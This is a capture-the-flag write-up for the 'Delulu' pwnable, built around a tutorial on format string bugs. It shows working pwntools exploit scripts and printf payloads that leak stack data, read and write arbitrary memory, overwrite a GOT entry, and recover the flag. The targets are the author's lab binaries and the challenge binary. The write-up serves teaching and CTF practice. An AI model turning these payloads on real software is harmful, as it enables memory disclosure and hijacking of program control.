# Delulu

```console
inte@debian-pc:~$ file delulu
delulu: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=edae8c8bd5153e13fa60aa00f53071bb7b9a122f, for GNU/Linux 3.2.0, not stripped
```

```console
inte@debian-pc:~$ checksec delulu
[*] '/mnt/hgfs/corridor/pwn_delulu/delulu'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```

## IDA Pseudocode

Decompilation of the `main()` function:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4[2]; // [rsp+0h] [rbp-40h] BYREF
  __int64 buf[6]; // [rsp+10h] [rbp-30h] BYREF

  buf[5] = __readfsqword(0x28u);
  v4[0] = 0x1337BABELL;
  v4[1] = (__int64)v4;
  memset(buf, 0, 32);
  read(0, buf, 31uLL);
  printf("\n[!] Checking.. ");
  printf((const char *)buf);
  if ( v4[0] == 0x1337BEEF )
    delulu();
  else
    error("ALERT ALERT ALERT ALERT\n");
  return 0;
}
```

Decompilation of the `delulu()` function:

```c
unsigned __int64 delulu()
{
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(40u);
  fd = open("./flag.txt", 0);
  if ( fd < 0 )
  {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
    exit(1);
  }
  printf("You managed to deceive the robot, here's your new identity: ");
  while ( read(fd, &buf, 1uLL) > 0 )
    fputc(buf, _bss_start);
  close(fd);
  return v3 - __readfsqword(40u);
}
```

The objective is to modify the value of `v4[0]` from `0x1337BABE` to `0x1337BEEF`  
Arbitrary user-controlled input is being passed to `printf`, giving rise to a format string bug.

I'll expand this write-up to provide a crash course on format string bugs.

## Format String Bugs

`printf()` is a C function that outputs formatted data to `stdout`.  
The first argument to `printf` is called the `format string`. It may contain ordinary characters (which are copied to the `stdout` unchanged) as well as `format specifiers` (which get replaced by subsequent arguments passed to `printf`), e.g. `%s`.

Example:

```c
#include <stdio.h>

int main() {
  char name[] = "Alice";
  char subject[] = "Physics";
  int marks = 94;

  printf("%s scored %d marks on the %s test\n", name, marks, subject);
  return 0;
}
```

Output:

```console
inte@debian-pc:~$ docker run --rm -v "$(pwd):/app" -w /app gcc:10.5.0 gcc example1.c -o example1
inte@debian-pc:~$ ./example1
Alice scored 94 marks on the Physics test
```

**Note:** I'm using a `gcc` docker container for pinning the version of `gcc` and `libc`

While parsing the `format string`, if `printf()` encounters a `format specifier`, it expects a subsequent argument of the corresponding type passed to the function.  
Now consider the scenario where a `format specifier` is present, but corresponding arguments are not passed to the function:

```c
  printf("%x");
```

It'd retrieve unintended data, leading to format string bugs. In this example, the value stored in the `rsi` register would be retrieved by `printf()`.

The System V ABI Calling Convention (used by 64-bit linux) dictates that registers `rdi`, `rsi`, `rdx`, `rcx`, `r8` and `r9` store initial 6 arguments passed to any function. If more than 6 arguments are passed, the remaining arguments are stored on the stack.  
As `printf()` encounters `%x`, it retrieves the value from `rsi` register and displays it.  
Even when `rsi` was not set in the current stack frame, it might still have uninitialized data or values set by preceding functions.  

`rsi` stores the second argument.  Why was it used instead of `rdi`, which stores the first argument? Because `rdi` would always store the pointer to `format string`)

Consider another example:

```c
  printf("%p %p %p %p %p %p %p %p %p %p");
```

In this example, values from the `rsi`, `rdx`, `rcx`, `r8`, and `r9` registers, as well as 5 values from top of the stack would get printed.

Consider another example:

```c
#include <stdio.h>

int login(const char* username, const char* password) {
    return 0;
}

int main() {
  char input[20];
  char flag[] = "CTF{flag_on_stack}";

  scanf("%19s", input);
  login("inte", "CTF{flag_in_args}");
  printf(input);

  return 0;
}
```

The `flag` variable gets declared and its value gets stored on the stack.  
Afterwards, the call stack for `login()` sets `rsi` to `CTF{flag_in_args}`  
The following `printf()` call has nothing to do with the `flag` or the argument to `login`, and yet they can be leaked:

```console
inte@debian-pc:~$ docker run --rm -v "$(pwd):/app" -w /app gcc:10.5.0 gcc example2.c -o example2
inte@debian-pc:~$ ./example2
%s.%p.%p.%p.%p.%p.%p.%p
CTF{flag_in_args}.(nil).(nil).0x402005.0x7efc275cca80.0x67616c667b465443.0x636174735f6e6f5f.0x7d6b
```

The first three values from the stack are little-endian hex representations of the flag:

```py
>>> from pwn import *
>>> p64(0x67616c667b465443)
b'CTF{flag'
>>> p64(0x636174735f6e6f5f)
b'_on_stac'
>>> p16(0x7d6b)
b'k}'
```

This demonstration illustrates that format string bugs are a powerful leak primitive.  
They can leak PIE and libc addresses from the stack, allowing us to calculate the PIE and libc base.  
They can even leak stack canaries.

In `format strings`, the `$` can be used in conjunction with `format specifier` to specify that an argument at a specific position has to be used.

Example:

```c
#include <stdio.h>

int main() {
  printf("Between %1$d and %2$d, %1$d is greater\n", 1337, 420);
  return 0;
}
```

Output:

```console
inte@debian-pc:~$ docker run --rm -v "$(pwd):/app" -w /app gcc:10.5.0 gcc example3.c -o example3
inte@debian-pc:~$ ./example3
Between 1337 and 420, 1337 is greater
```

This feature allows more comprehensive and efficient leaks.

### Arbitrary read with `%s`

The `%s` format specifier brings even more value to the table.  
When `printf` encounters the `%s` format specifier, it expects an argument which is a string pointer. If no argument is specified, it attempts to defererence and print the value from `rsi`.  
Using `%offset$n`, we can try to dereference any value from those 5 registers and the stack.

CTF pwnables with format string bugs often use a function to receive user input and pass it to `printf()`.  
Essentially, the **user input string gets stored on the stack** and the pointer to it gets passed to `printf()`.  
**What if we forge our user input to look like a pointer on the stack?**  
(Bear in mind that we can always locate our input on the stack using the leaking capabilities of format string bug.)  
Since we can find the offset to this forged pointer, can we coerce `printf()` into dereferencing the value pointed by it?  

The answer is yes. Consider this payload: `forged_pointer%offset$s`  
The offset is chosen such that it points to our input on stack, i.e. the forged pointer, which then gets dereferenced, resulting in an arbitrary memory read primitive.

Here's an example:

```c
#include <stdio.h>

char flag[] = "CTF{secret_flag}";

int main() {
  char input[20];
  char *ptr = &flag;

  printf("Flag is hidden at %p\n", ptr);

  scanf("%19s", input);
  printf(input);

  return 0;
}
```

```console
inte@debian-pc:~$ docker run --rm -v "$(pwd):/app" -w /app gcc:10.5.0 gcc example4.c -o example4
inte@debian-pc:~$ ./example4
Flag is hidden at 0x404040
%p.%p.%p.%p.%p.%p
0xa.(nil).(nil).0x40201d.0x7fa620751a80.0x70252e70252e7025
```

Observe the value at offset 6; it is the hex representation of initial 8 bytes of our input.

```py
>>> from pwn import *
>>> p64(0x70252e70252e7025)
b'%p.%p.%p'
```

Therefore, the forged pointer should be `\x40\x40\x40\x00\x00\x00\x00\x00`, and the offset should be 6, resulting in the payload `\x40\x40\x40\x00\x00\x00\x00\x00%6$s`  
We still have a little problem. `printf()` interprets null bytes (`\x00`) as string terminators. Therefore, it would parse our payload as `\x40\x40\x40`  
A workaround for this problem is to arrange the payload as `%7$s||||\x40\x40\x40\x00\x00\x00\x00\x00`. We must ensure that the `format specifier` takes up 8 bytes. It also means that our offset is no longer 6, but 7 instead (the forged pointer moved further on stack)

We can use `pwntools` to send raw bytes to the pwnable.

```py
from pwn import *

exe = context.binary = ELF('./example4', checksec=False)
# context.aslr = False
# context.log_level = 'debug'

p = exe.process()

# gdb.attach(p, gdbscript='b* main+72')
# pause()

p.sendline(b'%7$s||||\x40\x40\x40\x00\x00\x00\x00\x00')
p.interactive()
```

```console
inte@debian-pc:~$ python3 exploit.py
[+] Starting local process '/mnt/hgfs/corridor/fmtstr_lab/example4': pid 4517
[*] Switching to interactive mode
[*] Process '/mnt/hgfs/corridor/fmtstr_lab/example4' stopped with exit code 0 (pid 4517)
Flag is hidden at 0x404040
CTF{secret_flag}||||@@@[*] Got EOF while reading in interactive
```

When debugging issues, it is helpful to replace `%s` in the payload with `%p`

### Arbitrary write with `%n`

Next up, we have `%n` format specifier, the capo di tutti capi.  
When `printf` encounters `%n`, it expects an integer argument and stores the number of characters written so far into this argument.  
An example for demonstration:

```c
#include <stdio.h>

int main() {
  int box;
  int crate = 10;

  printf("1337%n\n", &box);
  printf("abcd whatever%n\n", &crate);
  printf("%d\n", box);
  printf("%d\n", crate);

  return 0;
}
```

```console
inte@debian-pc:~$ docker run --rm -v "$(pwd):/app" -w /app gcc:10.5.0 gcc example5.c -o example5
inte@debian-pc:~$ ./example5 
1337
abcd whatever
4
13
```

The values stored in `box` and `crate` become 4 and 13, respectively, as there are 4 characters in `1337` and 13 in `abcd whatever`.

**Using `%n`, we can also designate the target location to write to (similar to `%s`)**.  
The payload would contain a set count of characters (say `m`), followed by `%offset$n|forged_address` to write `m` to the location pointed by `forged_address`. As in example 4, the forged address is our input and offset must point to forged address on stack.  
An example is in order.

```c
#include <stdio.h>

int target = 0x1337;

int main() {
  char input[20];
  int *ptr = &target;

  printf("Target address: %p\n", ptr);

  scanf("%19s", input);
  printf(input);

  printf("\n%x\n", target);

  return 0;
}
```

```console
inte@debian-pc:~$ docker run --rm -v "$(pwd):/app" -w /app gcc:10.5.0 gcc example6.c -o example6
inte@debian-pc:~$ ./example6
Target address: 0x404038
%6$p
0x70243625
1337
```

`0x70243625` is `%6$p` in hex; therefore, the offset to input is 6.  
To overwrite `0x1337` with `0xa`, i.e. 10, the payload would be `0123456789%8$n||\x38\x40\x40\x00\x00\x00\x00\x00`  
The offset to forged address changed to 8 because 6 would point to `01234567` and 7 would point to `89%8$n||`.  
We can use `pwntools` to send raw bytes to the pwnable.

```py
from pwn import *

exe = context.binary = ELF('./example6', checksec=False)
# context.aslr = False
# context.log_level = 'debug'

p = exe.process()

# gdb.attach(p, gdbscript='b* main+72')
# pause()

p.sendline(b'0123456789%8$n||\x38\x40\x40\x00\x00\x00\x00\x00')
p.interactive()
```

```console
inte@debian-pc:~$ python3 exploit.py
[+] Starting local process '/mnt/hgfs/corridor/fmtstr_lab/example6': pid 2782
[*] Switching to interactive mode
[*] Process '/mnt/hgfs/corridor/fmtstr_lab/example6' stopped with exit code 0 (pid 2782)
Target address: 0x404038
0123456789||8@@
a
```

`0x1337` was overwritten by `0xa` as expected. However, this technique is only feasible for writing small numbers.  
Format string bugs are often used for GOT overwrite, where the numbers to be written are extremely large.  
There's scope for improvement: `format strings` allow control over the width and alignment of printed arguments.  
For example, 

```c
#include <stdio.h>

int main() {
  printf("Name --> %1$15s Score --> %2$12d\n", "Alice", 7331);
  printf("Name --> %1$15s Score --> %2$12d\n", "Oppenheimer", 45000000);
  return 0;
}
```

```console
inte@debian-pc:~$ docker run --rm -v "$(pwd):/app" -w /app gcc:10.5.0 gcc example7.c -o example7
inte@debian-pc:~$ ./example7
Name -->           Alice Score -->         7331
Name -->     Oppenheimer Score -->     45000000
```

Take note of the padding. We can abuse this feature to set the character count to a very high number.  
If the exploit script for example 6 makes use of this feature, we can easily replace `0x1337` with a large number like `0xc0de` (49374 in decimal).

```py
from pwn import *

exe = context.binary = ELF('./example6', checksec=False)
# context.aslr = False
# context.log_level = 'debug'

p = exe.process()

# gdb.attach(p, gdbscript='b* main+72')
# pause()

p.sendline(b'%8$49374p%8$n|||\x38\x40\x40\x00\x00\x00\x00\x00')
p.interactive()
```

```console
inte@debian-pc:~$ python3 exploit.py
[+] Starting local process '/mnt/hgfs/corridor/fmtstr_lab/example6': pid 2782
[*] Switching to interactive mode
[*] Process '/mnt/hgfs/corridor/fmtstr_lab/example6' stopped with exit code 0 (pid 2782)
Target address: 0x404038

// lots of empty space

      0x404038|||8@@
c0de
```

We have yet another trick up our sleeves which allows us to overwrite only one or two bytes of the target.  
`printf()` has `%hn` and `%hhn` format specifiers which imply that the number of characters written so far is to be stored into data type `short int` (a 16-bit integer) and `signed char` (an 8-bit integer) respectively.  
It allows for finer control over what we write.

For demonstration, I'd use a pwnable from an old CTF with partial RELRO and no PIE:

```c
#include <stdio.h>
#include <stdlib.h>

int win()
{
    system("cat flag.txt");
    return 0;
}

int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char input[20];

    scanf("%19s", input);
    printf(input);

    exit(1);
}
```

The goal was to overwrite the GOT address of the function `exit()` with the address of the function `win()`.  

```console
inte@debian-pc:~$ docker run --rm -v "$(pwd):/app" -w /app gcc:10.5.0 gcc lab.c -o lab
inte@debian-pc:~$ ./lab     
%6$p
0x70243625
```

`0x70243625` is the hex representation of `%6$p`, implying that the offset to input is 6.  

```console
inte@debian-pc:~$ gdb ./lab
gef➤  r
Starting program: /mnt/hgfs/corridor/fmtstr_lab/lab 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
^C
Program received signal SIGINT, Interrupt.

gef➤  p win
$1 = {<text variable, no debug info>} 0x401162 <win>
gef➤  got

GOT protection: Partial RelRO | GOT functions: 5
 
[0x404018] system@GLIBC_2.2.5  →  0x401036
[0x404020] printf@GLIBC_2.2.5  →  0x401046
[0x404028] setvbuf@GLIBC_2.2.5  →  0x7ffff7e47ea0
[0x404030] __isoc99_scanf@GLIBC_2.7  →  0x7ffff7e22060
[0x404038] exit@GLIBC_2.2.5  →  0x401076
```

The address of `win()` is `0x401162`.  
The GOT address of `exit()` is `0x404038` and gets resolved to `0x401076`

Let's try overwriting `0x401076` with 100 (`0x64`) using `%n`, `%hn`, and `%hhn`. We'd observe the changes by attaching a debugger.

```py
from pwn import *

exe = context.binary = ELF('./lab', checksec=False)
# context.aslr = False
# context.log_level = 'debug'

p = exe.process()

gdb.attach(p, gdbscript='watch *0x404038')
pause()

p.sendline(b'%8$100p%8$n|||||\x38\x40\x40\x00\x00\x00\x00\x00')
p.interactive()
```

Before overwrite:

```console
gef➤  x/6g 0x404038-32
0x404018 <system@got.plt>:  0x401036  0x401046
0x404028 <setvbuf@got.plt>: 0x7f9b6dfffea0  0x7f9b6dfda060
0x404038 <exit@got.plt>:  0x401076  0x0
```

After overwrite:

```console
gef➤  x/6g 0x404038-32
0x404018 <system@got.plt>:  0x401036  0x7f9b6dfda4c0
0x404028 <setvbuf@got.plt>: 0x7f9b6dfffea0  0x7f9b6dfda060
0x404038 <exit@got.plt>:  0x64  0x0
```

When using `%hn`, the payload would be `%8$100p%8$hn||||\x38\x40\x40\x00\x00\x00\x00\x00`  
Before overwrite:

```console
gef➤  x/6g 0x404038-32
0x404018 <system@got.plt>:  0x401036  0x401046
0x404028 <setvbuf@got.plt>: 0x7ff4dac12ea0  0x7ff4dabed060
0x404038 <exit@got.plt>:  0x401076  0x0
```

After overwrite:

```console
gef➤  x/6g 0x404038-32
0x404018 <system@got.plt>:  0x401036  0x7ff4dabed4c0
0x404028 <setvbuf@got.plt>: 0x7ff4dac12ea0  0x7ff4dabed060
0x404038 <exit@got.plt>:  0x400064  0x0
```

Only the lower 2 bytes were overwritten.  
When using `%hhn`, the payload becomes `%8$100p%8$hhn|||\x38\x40\x40\x00\x00\x00\x00\x00`  
Before overwrite:

```console
gef➤  x/6g 0x404038-32
0x404018 <system@got.plt>:  0x401036  0x401046
0x404028 <setvbuf@got.plt>: 0x7fb836091ea0  0x7fb83606c060
0x404038 <exit@got.plt>:  0x401076  0x0
```

After overwrite:

```console
gef➤  x/6g 0x404038-32
0x404018 <system@got.plt>:  0x401036  0x7fb83606c4c0
0x404028 <setvbuf@got.plt>: 0x7fb836091ea0  0x7fb83606c060
0x404038 <exit@got.plt>:  0x401064  0x0
```

Only the lowest byte was overwritten.  
I hope that format string bugs no longer feel alien to the reader.

## Solving the challenge

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4[2]; // [rsp+0h] [rbp-40h] BYREF
  __int64 buf[6]; // [rsp+10h] [rbp-30h] BYREF

  buf[5] = __readfsqword(0x28u);
  v4[0] = 0x1337BABELL;
  v4[1] = (__int64)v4;
  memset(buf, 0, 32);
  read(0, buf, 31uLL);
  printf("\n[!] Checking.. ");
  printf((const char *)buf);
  if ( v4[0] == 0x1337BEEF )
    delulu();
  else
    error("ALERT ALERT ALERT ALERT\n");
  return 0;
}
```

In the provided challenge, the objective is to modify the value of `v4[0]` from `0x1337BABE` to `0x1337BEEF`  
Since we need to overwrite the lower two bytes, `%hn` would be ideal.

I explained how a known address can be overwritten in the above examples. However, in the provided challenge, the address to be overwritten is dynamic. It is an address on the stack and changes every time the pwnable executes.

To tackle this scenario, take a step back and consider the `%s` case, where we read values from the stack without specifying an address.  
We used `%offset$n` to leak values from the stack.  
The same idea can be applied with `%n` to overwrite values on the stack.

```console
inte@debian-pc:~$ ./delulu 

      🟨🟨🟨
      🟨🟨🟨
      🟨🟨🟨
   🟨🟨🟨🟨🟨🟨
   🟨🟨🟨🟨🟨🟨
   🟨🟨🟨🟨🟨🟨
  🟨🟨🟨🟨🟨🟨🟨
🟨🟨🟨🟨🟨🟨🟨🟨🟨
🟨⬛️⬛️⬛️🟨⬛️⬛️⬛️🟨
🟨⬛️⬜️⬜️🟨⬛️⬜️⬜️🟨
🟨⬛️⬜️⬜️🟨⬛️⬜️⬜️🟨
🟨🟨🟨🟨🟨🟨🟨🟨🟨
⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
🟨🟨🟨⬛️⬛️⬛️🟨🟨🟨
🟨🟨🟨🟨🟨🟨🟨🟨🟨
🟪🟪🟪🟪🟪🟪🟪🟪🟪
    🟪🟪🟪🟪🟪
🟨🟪🟪🟨🟨🟨🟪🟪🟨
🟨🟪🟪🟨🟨🟨🟪🟪🟨
🟨🟨🟪🟨🟨🟨🟪🟨🟨
🟨🟨🟪🟨🟨🟨🟪🟨🟨
🟨🟨🟪🟨🟨🟨🟪🟨🟨
🟨🟨🟪🟪🟨🟨🟪🟪🟨
🟨🟨🟨🟨🟨🟨🟨🟨🟨
  🟪🟪🟪🟪🟪🟪
    🟪🟪🟪🟪🟪🟪
  🟨🟨🟨🟨🟨🟨🟨🟨
  🟨🟨🟨🟨🟨🟨🟨🟨
  🟨🟨🟨🟨🟨🟨🟨🟨
  🟨🟨🟨🟨🟨🟨🟨🟨
  🟨🟨🟨🟨🟨🟨🟨🟨
      🟨🟨🟨🟨
🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨

The D-LuLu face identification robot will scan you shortly!

Try to deceive it by changing your ID.

>> %6$p

[!] Checking.. 0x1337babe

[-] ALERT ALERT ALERT ALERT

```

The value at offset 6 is `0x1337babe`, and `0xbeef` is 48879 in decimal.  
Therefore, the payload should be `%7$48879p%7$hn` (the offset would shift since our input is greater than 8 bytes now)

```console
inte@debian-pc:~$ ./delulu 

      🟨🟨🟨
      🟨🟨🟨
      🟨🟨🟨
   🟨🟨🟨🟨🟨🟨
   🟨🟨🟨🟨🟨🟨
   🟨🟨🟨🟨🟨🟨
  🟨🟨🟨🟨🟨🟨🟨
🟨🟨🟨🟨🟨🟨🟨🟨🟨
🟨⬛️⬛️⬛️🟨⬛️⬛️⬛️🟨
🟨⬛️⬜️⬜️🟨⬛️⬜️⬜️🟨
🟨⬛️⬜️⬜️🟨⬛️⬜️⬜️🟨
🟨🟨🟨🟨🟨🟨🟨🟨🟨
⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
🟨🟨🟨⬛️⬛️⬛️🟨🟨🟨
🟨🟨🟨🟨🟨🟨🟨🟨🟨
🟪🟪🟪🟪🟪🟪🟪🟪🟪
    🟪🟪🟪🟪🟪
🟨🟪🟪🟨🟨🟨🟪🟪🟨
🟨🟪🟪🟨🟨🟨🟪🟪🟨
🟨🟨🟪🟨🟨🟨🟪🟨🟨
🟨🟨🟪🟨🟨🟨🟪🟨🟨
🟨🟨🟪🟨🟨🟨🟪🟨🟨
🟨🟨🟪🟪🟨🟨🟪🟪🟨
🟨🟨🟨🟨🟨🟨🟨🟨🟨
  🟪🟪🟪🟪🟪🟪
    🟪🟪🟪🟪🟪🟪
  🟨🟨🟨🟨🟨🟨🟨🟨
  🟨🟨🟨🟨🟨🟨🟨🟨
  🟨🟨🟨🟨🟨🟨🟨🟨
  🟨🟨🟨🟨🟨🟨🟨🟨
  🟨🟨🟨🟨🟨🟨🟨🟨
      🟨🟨🟨🟨
🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨

The D-LuLu face identification robot will scan you shortly!

Try to deceive it by changing your ID.

>> %7$48879p%7$hn

[!] Checking..                                                                  

// lots of empty space

0x7ffc2dc3bc50
You managed to deceive the robot, here's your new identity: HTB{f4k3_fl4g_4_t35t1ng}
```

The same payload leads to the true flag on remote:

```text
HTB{m45t3r_0f_d3c3pt10n}
```
